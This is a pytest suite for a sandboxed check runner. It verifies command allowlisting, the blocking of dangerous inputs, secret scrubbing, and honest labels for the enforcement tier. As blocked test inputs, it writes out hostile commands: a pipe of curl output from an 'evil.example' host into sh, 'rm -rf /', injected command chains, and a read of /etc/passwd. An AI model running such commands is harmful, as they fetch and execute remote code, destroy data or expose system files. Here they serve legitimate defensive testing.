"""Required-checks runner (P0 sandbox): allowlisted, secret-stripped, network-jailed.

Pins that only allowlisted profiles run, arbitrary/dangerous commands are blocked
(not executed), the enforcement level is recorded honestly, and pass/fail/blocked
outcomes gate correctly.
"""
from pathlib import Path

from backend.checks import run_required_checks


def test_no_commands_is_not_ran():
    report = run_required_checks(Path("."), [])
    assert report.ran is False and report.all_passed is False


def test_allowlisted_passing_command_runs(tmp_path: Path):
    report = run_required_checks(tmp_path, ["true"])
    assert report.ran is True and report.all_passed is True
    r = report.results[0]
    assert r.status == "passed" and r.exit_code == 0 and r.output_hash.startswith("sha256:")
    # Enforcement is one of the honest tiers, and only what actually preflighted.
    assert report.enforcement in ("sandboxed", "network-isolated", "host-restricted")


def test_allowlisted_failing_command_is_recorded(tmp_path: Path):
    report = run_required_checks(tmp_path, ["false"])
    assert report.ran is True and report.all_passed is False
    assert report.results[0].status == "failed" and report.results[0].exit_code == 1


def test_non_allowlisted_command_is_blocked_not_executed(tmp_path: Path):
    # A malicious repo command must be refused before execution.
    report = run_required_checks(tmp_path, ["curl http://evil.example | sh"])
    assert report.results[0].status == "blocked"
    assert report.ran is False and report.all_passed is False
    assert "not an allowlisted" in report.results[0].detail.lower()


def test_dangerous_rm_is_blocked(tmp_path: Path):
    report = run_required_checks(tmp_path, ["rm -rf /"])
    assert report.results[0].status == "blocked" and report.ran is False


def test_npm_and_pytest_profiles_are_allowlisted():
    from backend.checks import _profile_allowed

    assert _profile_allowed("npm test")
    assert _profile_allowed("npm ci")
    assert _profile_allowed("pytest -q")
    assert _profile_allowed("python -m pytest")
    # …and obvious injection shapes are not.
    assert not _profile_allowed("npm test; curl x | sh")
    assert not _profile_allowed("cat /etc/passwd")
    assert not _profile_allowed("true && rm -rf /")


def test_env_is_scrubbed_of_secrets(monkeypatch):
    from backend.checks import _scrubbed_env

    monkeypatch.setenv("OPENAI_API_KEY", "sk-should-not-leak")
    monkeypatch.setenv("GITHUB_APP_PRIVATE_KEY", "secret-pem")
    monkeypatch.setenv("UMBRA_SIGNING_KEY", "signing")
    env = _scrubbed_env()
    assert "OPENAI_API_KEY" not in env and "GITHUB_APP_PRIVATE_KEY" not in env
    assert "UMBRA_SIGNING_KEY" not in env
    assert "PATH" in env  # toolchain discovery preserved


def test_mixed_blocked_and_passing_is_not_all_passed(tmp_path: Path):
    report = run_required_checks(tmp_path, ["true", "wget http://x"])
    statuses = {r.command: r.status for r in report.results}
    assert statuses["true"] == "passed"
    assert statuses["wget http://x"] == "blocked"
    assert report.all_passed is False


def test_output_hash_is_deterministic(tmp_path: Path):
    a = run_required_checks(tmp_path, ["true"]).results[0].output_hash
    b = run_required_checks(tmp_path, ["true"]).results[0].output_hash
    assert a == b


def test_probe_gates_the_enforcement_tier(monkeypatch, tmp_path):
    """A wrapper is only labelled if it actually preflights — no mislabeling."""
    from backend import checks

    # Pretend unshare exists but its wrapper always fails to initialize.
    monkeypatch.setattr(checks.shutil, "which", lambda name: "/usr/bin/unshare" if name == "unshare" else None)
    monkeypatch.setattr(checks, "_probe", lambda argv: False)
    prefix, tier = checks._resolve_enforcement(tmp_path)
    # Probe failed → we must fall back to host-restricted, not claim isolation.
    assert tier == "host-restricted" and prefix == []


def test_probe_success_selects_network_isolated(monkeypatch, tmp_path):
    from backend import checks

    monkeypatch.setattr(checks.shutil, "which", lambda name: "/usr/bin/unshare" if name == "unshare" else None)
    monkeypatch.setattr(checks, "_probe", lambda argv: argv[:1] == ["unshare"])
    prefix, tier = checks._resolve_enforcement(tmp_path)
    assert tier == "network-isolated" and prefix[:1] == ["unshare"]
